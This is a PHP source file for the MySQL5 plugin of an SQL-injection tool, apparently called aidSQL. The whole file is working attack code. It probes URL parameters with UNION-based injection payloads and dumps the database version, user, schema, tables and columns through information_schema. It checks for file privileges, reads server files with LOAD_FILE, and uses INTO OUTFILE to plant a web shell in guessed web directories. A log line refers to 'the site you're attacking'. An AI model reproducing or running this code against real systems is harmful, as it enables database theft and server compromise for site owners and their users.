<?php

	namespace aidSQL\plugin\sqli {

		class MySQL5 extends InjectionPlugin {

			const		PLUGIN_NAME						= "MySQL5 Standard Plugin by Juan Stange";

			private	$_affectedField				=	NULL;
			private	$_maxFields						=	NULL;
			private	$_table							=	NULL;
			private	$_totalRegisters				=	0;				//Total registers found by count(*)
			private	$_step							=	10;			//step LIMIT _currentRegisterStep,_currentRegisterStep+_step
			private	$_currentRegisterStep		=	0;
			private	$_fields							=	NULL;			//table fields
			private	$_groupConcatLength			=	1024;			//Default group concat character length
			private	$_openTag						=	NULL;
			private	$_closeTag						=	NULL;
			private	$_fieldPayloads				=	array("","'", "%'","')","%')");
			private	$_endingPayloads				=	array("ORDER BY 1");
			private	$_commentPayloads				=	array("/*","--","#");
			private	$_currFieldPayload			=	NULL;
			private	$_currTerminatingPayload	=	NULL;
			private	$_affectedDatabases			=	array("mysql5");
			private	$_getCompleteSchema			=	TRUE;
			private	$_version						=	NULL;
			private	$_strRepeat						=	100;
			private	$_repeatCharacter				=	"1";

			public function getPluginName(){
				return self::PLUGIN_NAME;
			}

			public function getAffectedDatabases(){
				return $this->_affectedDatabases;
			}

			private function orderRequestVariables(Array $requestVariables){

				$numVariables	=	array();
				$strVariables	=	array();

				foreach($requestVariables as $name=>$value){

					if(is_numeric($value)){
						$numVariables[$name]	=	$value;
					}else{
						$strVariables[$name]	=	$value;
					}

				}

				return array("strings"=>$strVariables,"numeric"=>$numVariables);

			}


			public function setConfig (Array $config){

				parent::setConfig($config);

				if(isset($config["field-payloads"])){

					$payloads	=	explode("_",$config["field-payloads"]);
					$this->setFieldPayloads($payloads);

				}

				if(isset($config["ending-payloads"])){

					$payloads	=	explode("_",$config["ending-payloads"]);
					$this->setEndingPayloads($payloads);

				}

				if(isset($config["comment-payloads"])){

					$payloads	=	explode("_",$config["comment-payloads"]);
					$this->setCommentPayloads($payloads);

				}

				if(isset($config["injection-attempts"])){

					$this->setInjectionAttempts($config["injection-attempts"]);

				}

			}


			public function setEndingPayloads(Array $payloads){

				$this->_endingPayloads	=	$payloads;

			}


			public function setCommentPayloads(Array $payloads){

				$this->_commentPayloads	=	$payloads;

			}


			/**
			*Checkout if the given URL by the HttpAdapter is vulnerable or not
			*This method combines execution
			*/

			public function isVulnerable(){

				$url			=	$this->_httpAdapter->getUrl();
				$vars			=	$url->getQueryAsArray();
				$vars			=	$this->orderRequestVariables($vars);
				$found		=	FALSE;

				$keys	=	array_keys($this->_config);

				if(in_array("numeric-only",$keys)){

					$vars	=	$vars["numeric"];

				}elseif(in_array("strings-only",$keys)){

					$vars	=	$vars["strings"];

				}else{	//Default, use both

					$vars	=	array_merge($vars["numeric"],$vars["strings"]);

				}

				//Start offset, use it when you know the amount of fields involved in the union injection

				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;

				if(!$offset){
					throw(new \Exception("Start offset should be an integer greater than 0!"));
				}

				$varCount	=	0;
				$maxVars		=	(isset($this->_config["var-count"]))	?	(int)$this->_config["var-count"] : NULL;

				foreach($vars as $variable=>$value){

					if(!is_null($maxVars)&&$varCount++ > $maxVars){
						die("BREAK, LOL");
						break;
					}

					$this->setAffectedVariable($variable,$value);

					for($i=$offset;$i<=$this->_injectionAttempts;$i++){

						$this->setMaxFields($i);

						$this->log("[$variable] Attempt:\t$i",0,"light_cyan");

						foreach($this->_commentPayloads as $commentPayload){

							$this->log("Comment Payload:\t$commentPayload",0,"light_cyan");

							$this->setQueryCommentOpen($commentPayload);
				
							foreach($this->_endingPayloads as $terminatingPayload){

								$this->log("Ending Payload:\t$terminatingPayload",0,"light_cyan");

								$this->_currTerminatingPayload = $terminatingPayload;

								$injection	=	$this->makeDiscoveryInjection();

								foreach($this->_fieldPayloads as $FPL){

									$this->log("Field Payload:\t$FPL",0,"light_cyan");

									$this->_currFieldPayload	=	$FPL;

									$matches	=	$this->analyzeInjection($injection);

									$code		=	$this->_httpAdapter->getHttpCode();
									$color	=	($code==200)	?	"light_cyan"	:	"yellow";
									$status	=	($code==200)	?	0	:	2;
							
									$this->log("HTTP ".$this->_httpAdapter->getHttpCode(),$status,$color);

									if(isset($matches[0])){

										$this->_isVulnerable	=	TRUE;

										$this->log($this->_httpAdapter->getUrl(),0,"light_green",TRUE);
										$this->log("FOUND SQL INJECTION!!!",0,"light_green",TRUE);
										$this->log("Affected Variable\t:\t$variable",0,"light_purple");
										$this->log("Field Count\t\t:\t$i",0,"light_purple");

										//Actually we can have a series of childNodes here any field is good, so we just pick
										//a random field.
	
										$this->log("Checking database version ... ",0,"green");
										$this->setAffectedVariable($variable,$value);
										$this->setMaxFields($i);

										return TRUE;

									}

								}

							}

						}

					}

					$url	=	$this->_httpAdapter->getUrl();
					$url->addRequestVariable($variable,$value); //restore value if we couldnt find the vulnerable field
					$this->_httpAdapter->setUrl($url);

				}

				return FALSE;

			}

			private function checkVersion($version){

				if(substr($version,0,1)!=5){
					return FALSE;
				}

				return TRUE;

			}


			public function getOpenTag(){

				return $this->_openTag	=	"REPEAT(".\String::hexEncode($this->_repeatCharacter).",".$this->_strRepeat.')';

			}


			public function getCloseTag(){

				return $this->_closeTag	=	"REPEAT(".\String::hexEncode($this->_repeatCharacter).",".$this->_strRepeat.')';

			}


			private function tagConcat($string){

				$pre	= NULL;
				$post	= NULL;

				$openConcatTag		=	$this->getOpenTag();
				$closeConcatTag	=	$this->getCloseTag();

				$pre					=	"CONCAT($openConcatTag,";
				$post					=	",$closeConcatTag)";

				return $pre.$string.$post;

			}

			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
			//some databases can be pretty massive, and the default length of characters brough by GROUP_CONCAT is 1024
			//This simple function will determine this according to the self::_groupConcatLength parameter (default 1024)

			private function detectTruncatedData($string=NULL){

				if(strlen($string) == $this->_groupConcatLength){

					$this->log("Warning! Detected possibly truncated data!",2,"yellow");
					return TRUE;

				}

				return FALSE;
			
			}

			private function getGroupConcatLength(){

				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");

				$select	=	"@@group_concat_max_len";
				$length	=	(int)$this->execute($select);

				if(!$length){

					$length	=	1024;
					$this->log("Warning, couldnt properly determine group concat length, setting length to $length",0,"yellow");

				}else{

					$this->log("@@group_concat_max_len = $length",0,"light_cyan");

				}

				$this->_groupConcatLength	=	$length;

			}


			public function setStep($step=10){

				$step = (int)$step;

				if(!$step){
					throw (new \Exception("Step should be an integer greater than 0"));
				}

				$this->_step = $step;

			}

			public function setFieldPayloads(Array $payloads){

				$this->_fieldPayloads	=	$payloads;

			}

			public function getFieldPayloads(){

				return $this->_fieldPayloads;

			}

			public function setFields(Array $fields){

				$this->_fields = $fields;

			}

			/**
			 *	Returns an SQL injection string for the next sequence of registers
			 *
			 * @param Array $fields If not provided all fields will be used by default
			 * @return String SQL injection string for the next set of registers
			 * @return boolean FALSE No registers left
			 *
			 */

			public function getNext($fields=array()){

				//@TODO

			}

			/**
			*Sets the affected field to inject further commands
			*@param int $affectedField
			*/

			public function setAffectedField($affectedField=NULL){

				if(empty($affectedField)){
					throw (new \Exception("The affected field cant be empty"));
				}

				$this->_affectedField = $affectedField;

			}

			public function setMaxFields($maxFields){

				$maxFields = (int)$maxFields;

				if(is_null($maxFields)||$maxFields==0){
					throw (new \Exception("The max fields cannot be NULL or 0"));
				}

				$this->_maxFields = $maxFields;

			}

			public function getSchema($complete=TRUE){

				$version	=	$this->getVersion();

				if(!$this->checkVersion($version)){
					throw(new \Exception("Database version mismatch: $version, cant get database schema!"));
				}


				//Determines server global variable @@group_concat_max_len
				$this->getGroupConcatLength();

				$select									=	"GROUP_CONCAT(TABLE_NAME)";
				$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";

				$tables									=	$this->execute($select,$from);
				$dbSchema								=	new \aidSQL\core\DatabaseSchema();
				$restoreTerminatingPayload			=	$this->_currTerminatingPayload;

				if($this->detectTruncatedData($tables)){	//We have to do 1 by 1 table retrieval :/ bigger foot print

					$this->log("Performing table extraction one by one",2,"yellow");

					$limit									=	0;
					$select									=	"TABLE_NAME";
					$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";

					$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit++.",1";

					while($table	=	$this->execute($select,$from)){

						$this->log("Discovered table $table!",0,"light_purple");
						
						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit++.",1";

						//Add just the table to the table to the DatabaseSchema Object
						//Columns are retrieved from the runner, this is just because some people
						//will just like to retrieve all tables and leverage the footprint by not 
						//fetching table structure

						$dbSchema->addTable($table,array());

					}

				}else{	//no data trunking, everything cool

					$tables	=	explode(',',$tables);

					foreach($tables as $table){

						$dbSchema->addTable($table,array());

					}

				}

				$this->_currTerminatingPayload	=	$restoreTerminatingPayload;

				return $dbSchema;

			}


			public function getColumns($table=NULL){

				if(is_null($table)){

					throw(new \Exception("ERROR: Table name cannot be empty when trying to fetch columns! (Please report bug)"));
					return array();

				}

				$this->log("Fetching table \"$table\" columns ...",0,"white");

				$select							=	"GROUP_CONCAT(COLUMN_NAME)";
				$from								=	"FROM information_schema.columns WHERE table_schema=DATABASE() ".
														"AND table_name=".\String::hexEncode($table);

				$restoreTerminatingPayload	=	$this->_currTerminatingPayload;
				$this->_currTerminatingPayload	=	"ORDER BY 1 DESC";

				$tableFields	=	$this->execute($select,$from);

				if($this->detectTruncatedData($tableFields)){

					$limit			=	1;
					$select			=	"COLUMN_NAME";
					$from				=	"FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=$table";

					$tableFields					=	array();

					while($field	=	$this->execute($select,$from)){

						$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit.",1";
						$limit++;
						$tableFields[]	=	$field;

					}


				}else{

					$tableFields	=	explode(',',$tableFields);

					if(!is_array($tableFields)){

						$tableFields	=	array();

					}
					
				}

				$this->_currTerminatingPayload	=	$restoreTerminatingPayload;

				return $tableFields;

			}

			public function getDatabase(){

				$select	= "DATABASE()";
				return $this->execute($select);

			}

			private function cleanUpResult($result){

				$result	=	substr($result,$this->_strRepeat);
				$result	=	substr($result,0,$this->_strRepeat*-1);
				return $result;

			}

			protected function execute($select,$from=NULL,$useConcat=TRUE){

				$this->log("Doing $select Injection",0,"light_green");
				$generatedInjection	=	$this->generateInjection($select,$from,$useConcat);
				$this->log($generatedInjection,0,"light_cyan");

				$result	=	$this->analyzeInjection($generatedInjection);

				if($this->_isVulnerable){

					if($result===FALSE){		//Found vulnerable however something is failing, start injection from scratch

						$restoreMaxFields	=	$this->_maxFields;

						$this->log("Something wrong is going on here, restarting the $select injection",2,"yellow");

						$this->_maxFields=1;

						while($this->_maxFields<=$this->_injectionAttempts){	

							$result	=	$this->analyzeInjection($this->generateInjection($select,$from,$useConcat));

							if(isset($result[0])){
								return $result[0];
							}

							$this->_maxFields++;

						}

						$this->_maxFields	=	$restoreMaxFields;

						return FALSE;

					}

				}

				if(isset($result[0])){
					return $this->cleanUpResult($result[0]);
				}

				return FALSE;
				
			}

			public function getUser(){

				$select	=	"USER()";
				$user		=	$this->execute($select);
				return $user;

			}

			public function getVersion(){

				if(!is_null($this->_version)){
					return $this->_version;
				}

				$select	= "@@version";
				return $this->_version	=	$this->execute($select);
					
			}

			public function getDatadir(){

				$select	= "@@datadir";
				return $this->execute($select);

			}

			public function toFile(File $file){

				$select = "INTO OUT_FILE ";
				return $this->execute($select);

			}

			public function count(){

				if(!isset($this->_table)){
					throw(new \Exception("Cannot get register count from unespecified table, use setTable first"));
				}

				$select	= "COUNT(*)";
				$from		= "FROM ".$this->_table;
				return $this->execute($select,$from);

			}


			public function makeDiscoveryInjection(){

				$discover = array();

				for($i=1;$i<=$this->_maxFields;$i++){

					$discover[]= $this->tagConcat($i);

				}

				return implode($discover,",");

			}

			/**
			 *	Basic method which generates Injection strings based on the affected field and the max amount
			 * of fields available, this method is private and should only be used in this class
			 * @param String $select Paylod for the select field (The affected field)
			 * @param String $from Payload for the FROM condition
			 * @return String, sql injection string
			 */

			private function generateInjection($select,$from=NULL,$concat=TRUE){

				$fields=array();

				if(!isset($this->_maxFields)){

					throw (new \Exception("Cant generate injection with no field count!"));

				}

				for($i=1;$i<=$this->_maxFields;$i++){

					$fields[]=$this->tagConcat($select);

				}

				$fields = implode($fields,",");

				if(!empty($from)){

					$fields.=" $from";

				}

				return $fields;

			}

			/**
			*Combines URL execution with parsing
			*/

			private function analyzeInjection($injection,$useEndingPayload=TRUE){

				$variable	= $this->_affectedVariable;

				$value		= $variable["value"];
				$variable	= $variable["variable"];

				if($value==""){

					$value = mt_rand(0,10);

					$this->log("WARNING! Variable value is not set, this will probably make this plugin not to work!",2,"yellow");
					$this->log("Be sure to specify a valid value for the URL variable of the site you're attacking.",2,"yellow");
					$this->log("Assuming random value for variable $variable. Value is: $value",2,"yellow");

				}

				$value	.= $this->_currFieldPayload;

				if($useEndingPayload){

					$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();

				}else{

					$value		= "$value UNION ALL SELECT $injection ".$this->getQueryCommentOpen();

				}

				$content	=	parent::execute($variable,$value);

				return $this->_checkInjection($content);

			}


			private function _checkInjection($content){

				$openTag		=	$this->getOpenTag();
				$closeTag	=	$this->getCloseTag();

				$repeat	=	str_repeat($this->_repeatCharacter,$this->_strRepeat);
				$regex	= '/'.$repeat."+.*".$repeat.'/';

				$matches = NULL;

				preg_match_all($regex,$content,$matches,PREG_SET_ORDER);

				if(sizeof($matches)){

					$matching = array();

					foreach($matches as $key=>$match){

						$match=$match[0];
						$match = preg_replace("/^($openTag)/",'',$match);
						$match = preg_replace("/($closeTag)/",'',$match);
						$matching[$key]=$match;

					}

					return $matching;

				}

				return FALSE;

			}

			private function pickRandomValue(Array $array){

				shuffle($array);
				return $array[0];

			}

			public function isRoot($dbUser=NULL,\aidSQL\http\Adapter &$adapter=NULL){

				if(empty($dbUser)){
					throw(new \Exception("Database user passed was empty, cant check if its root or not!"));
				}

				if(!strpos($dbUser,"@")){
					throw (new \Exception("No @ found at database user!!!????"));
				}

				$user = substr($dbUser,0,strpos($dbUser,"@"));

				if(strtolower($user)=="root"){
					return TRUE;
				}

				$this->log("User is not root perse, looking up information_schema for file_priv",2,"yellow");

				//Check for the file privilege user permissions for writing
				//What it really takes to get a shell is the file writing privilege

				$filePrivilege	=	$this->checkPrivilege("file_priv",$dbUser);
				return $this->analyzeInjection($filePrivilege);

			}

			public function checkPrivilege($privilege,$user=NULL){

				$privilege			=	\String::hexEncode($privilege);
				$fieldInjection	=	"is_grantable";

				if(is_null($user)){

					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX(USER(),0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX(USER(),0x40,-1),0x27)";

				}else{

					$user					=	\String::hexEncode($user);
					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX($user,0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX($user,0x40,-1),0x27)";

				}

				return $this->generateInjection($fieldInjection,$tableInjection);

			}

			public function loadFile($file=NULL){

				$select	=	"LOAD_FILE(".\String::hexEncode($file).')';	
				$from		=	"";
				return $this->generateInjection($select,$from);	

			}


			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler $crawler,Array $options){

				$restoreUrl				=	$this->_httpAdapter->getUrl();
				$shellCode				=	$this->_shellCode;

				$webDefaultsPlugin	=	$pLoader->getPluginInstance("info","defaults",$this->_httpAdapter,$this->_log);
				$information			=	$webDefaultsPlugin->getInfo();

				if (!is_a($information,"\\aidSQL\\plugin\\info\\InfoResult")){

					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\info\\InfoResult"));
				}

				$webDirectories	=	$information->getWebDirectories();
				
				foreach($crawler->getFiles() as $file=>$type){
	
					$path	=	dirname($file);

					if($path=='.'){
						continue;
					}

					if(!in_array($path,$webDirectories)){

						$this->log("Adding crawler path information: $path",0,"light_green",TRUE);
						array_unshift($webDirectories,$path);

					}

				}

				array_unshift($webDirectories,'');

				$unixDirectories		=	$information->getUnixDirectories();
				$winDirectories		=	$information->getWindowsDirectories();

				if(!sizeof($webDirectories)){

					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red",TRUE);

				}

				$url	=	$this->_httpAdapter->getUrl();
				$host	=	$url->getHost();
				$url	=	$url->getScheme()."://$host";

				$fileName	=	$this->getShellName();

				foreach($webDirectories as $key=>$webDir){

					$webDir	=	trim($webDir,'/').'/';

					foreach($unixDirectories as $unixDir){
	
						$this->_httpAdapter->setUrl($restoreUrl);
			
						$unixDir					=	'/'.trim($unixDir,'/');
						$shellWebLocation		=	$url.'/'.$webDir.$fileName;

						$shellDirLocations	=	array();
						$shellDirLocations[]	=	$unixDir.'/'.$webDir.$fileName;
						$shellDirLocations[]	=	$unixDir.'/'.$host.'/'.$webDir.$fileName;

						if(preg_Match("#www\.#",$host)){
							$shellDirLocations[]	=	$unixDir.'/'.substr($host,strpos($host,'.')+1).'/'.$webDir.$fileName;
						}


						foreach($shellDirLocations as $shellDirLocation){

							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"white");
							$outFile		=	"INTO OUTFILE '$shellDirLocation'";

							$injection	=	$this->generateInjection($shellCode,$outFile);

							try{

								$this->analyzeInjection($injection,FALSE);

								$result			=	$this->analyzeInjection($this->loadFile($shellDirLocation));
								$decodedShell	=	\String::asciiEncode($shellCode);

								if($result!==FALSE&&sizeof($result)){

									if($result[0]==$decodedShell){
										return $shellWebLocation;
									}

								}
							
							}catch(\Exception $e){


							}

						}	

					}

				}


				return FALSE;

			}

			public static function getHelp(\aidSQL\core\Logger $logger){

				$logger->log("--sqli-mysql5-injection-attempts\tAt how many attempts shall we stop trying");
				$logger->log("--sqli-mysql5-start-offset\t\t<integer>Start the UNION injection at this offset (if you know what youre doing)");
				$logger->log("--sqli-mysql5-var-count\t\t<integer> Try this amount of variables per link");
				$logger->log("--sqli-numeric-only\t\t\tOnly try to perform injection on integer fields");
				$logger->log("--sqli-mysql5-strings-only\t\tOnly try to perform injection on string fields");
				$logger->log("--sqli-mysql5-field-payloads\t\tSet field payloads delimited by _\ti.e: _'_')_%)");
				$logger->log("--sqli-mysql5-ending-payloads\t\tSet ending payloads delimited by _\ti.e: LIMIT 1,1_ORDER BY 1");
				$logger->log("--sqli-mysql5-comment-payloads\t\tSet comment payloads delimited by _\ti.e: #_/*_--");
				$logger->log("--sqli-mysql5-shell-code\tPut your favorite shell code here i.e ".'<?php var_dump($_SERVER);?>');

			}

		}

	}
?>
